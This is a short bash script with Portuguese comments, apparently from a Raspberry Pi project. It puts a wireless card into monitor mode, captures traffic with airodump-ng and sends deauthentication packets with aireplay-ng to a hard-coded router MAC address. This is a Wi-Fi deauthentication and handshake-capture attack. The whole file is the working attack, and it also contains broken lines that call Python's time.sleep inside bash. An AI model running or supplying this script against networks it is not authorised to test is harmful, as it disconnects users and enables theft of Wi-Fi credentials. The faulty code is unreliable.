#!/bin/bash
CANAL_ALVO=$1
if [ -z "$CANAL_ALVO" ]; then CANAL_ALVO="1"; fi


sudo ip link set wlan1 down
sudo iw dev wlan1 set type monitor
sudo ip link set wlan1 up
sudo iwconfig wlan1 channel $CANAL_ALVO
sudo iwconfig wlan1 txpower 20

# Lança a captura em background primeiro
sudo timeout 35s airodump-ng wlan1 -c $CANAL_ALVO --write /home/pi/flipper-moon/captura_wifi -K 1 > /dev/null 2>&1 &

# Aguarda 3 segundos para o canal estabilizar
time.sleep(3)

# -0 5: Envia 5 pacotes de desautenticação para o ar
# -a: Define o endereço MAC do router alvo (Muda para o teu se quiseres)
sudo aireplay-ng -0 5 -a 2C:23:2A:4A:51:34 wlan1 > /dev/null 2>&1

# Aguarda o resto do tempo do timeout terminar
time.sleep(32)

echo "captura concluida"
